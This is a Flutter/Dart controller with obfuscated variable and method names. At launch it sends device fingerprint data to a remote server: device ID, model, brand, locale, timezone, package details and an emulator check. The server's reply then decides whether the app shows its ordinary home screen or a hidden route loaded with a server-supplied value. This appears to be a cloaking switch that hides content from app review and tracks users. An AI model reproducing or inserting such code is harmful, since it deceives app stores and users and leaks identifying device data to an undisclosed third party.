import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var thqcdgf = RxBool(false);
  var pguaws = RxBool(true);
  var fkwvex = RxString("");
  var maria = RxBool(false);
  var dubuque = RxBool(true);
  final ebcikpt = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ebvuciz();
  }


  Future<void> ebvuciz() async {

    maria.value = true;
    dubuque.value = true;
    pguaws.value = false;

    ebcikpt.post("https://rang.mikassa.xyz/hwunedmfrltig",data: await jyfsog()).then((value) {
      var jkden = value.data["jkden"] as String;
      var eltsrzw = value.data["eltsrzw"] as bool;
      if (eltsrzw) {
        fkwvex.value = jkden;
        alison();
      } else {
        schuster();
      }
    }).catchError((e) {
      pguaws.value = true;
      dubuque.value = true;
      maria.value = false;
    });
  }

  Future<Map<String, dynamic>> jyfsog() async {
    final DeviceInfoPlugin uidejcf = DeviceInfoPlugin();
    PackageInfo uonkx_mzbpf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var edobr = Platform.localeName;
    var fog_LKCraBps = currentTimeZone;

    var fog_wTrPILMb = uonkx_mzbpf.packageName;
    var fog_RrafSdpW = uonkx_mzbpf.version;
    var fog_luiLcqG = uonkx_mzbpf.buildNumber;

    var fog_gpubPm = uonkx_mzbpf.appName;
    var fog_Dghi = "";
    var fog_srQCwD  = "";
    var fog_se = "";
    var jeffHayes = "";
    var alfredaFerry = "";
    var leliaSchuppe = "";
    var haleighSauer = "";


    var fog_CAc = "";
    var fog_tq = false;

    if (GetPlatform.isAndroid) {
      fog_CAc = "android";
      var nulipe = await uidejcf.androidInfo;

      fog_se = nulipe.brand;

      fog_Dghi  = nulipe.model;
      fog_srQCwD = nulipe.id;

      fog_tq = nulipe.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fog_CAc = "ios";
      var fjwmrvzkp = await uidejcf.iosInfo;
      fog_se = fjwmrvzkp.name;
      fog_Dghi = fjwmrvzkp.model;

      fog_srQCwD = fjwmrvzkp.identifierForVendor ?? "";
      fog_tq  = fjwmrvzkp.isPhysicalDevice;
    }
    var res = {
      "fog_gpubPm": fog_gpubPm,
      "fog_luiLcqG": fog_luiLcqG,
      "fog_RrafSdpW": fog_RrafSdpW,
      "fog_wTrPILMb": fog_wTrPILMb,
      "fog_Dghi": fog_Dghi,
      "fog_LKCraBps": fog_LKCraBps,
      "fog_se": fog_se,
      "fog_srQCwD": fog_srQCwD,
      "edobr": edobr,
      "fog_CAc": fog_CAc,
      "fog_tq": fog_tq,
      "jeffHayes" : jeffHayes,
      "alfredaFerry" : alfredaFerry,
      "leliaSchuppe" : leliaSchuppe,
      "haleighSauer" : haleighSauer,

    };
    return res;
  }

  Future<void> schuster() async {
    Get.offAllNamed("/home");
  }

  Future<void> alison() async {
    Get.offAllNamed("/rie");
  }

}
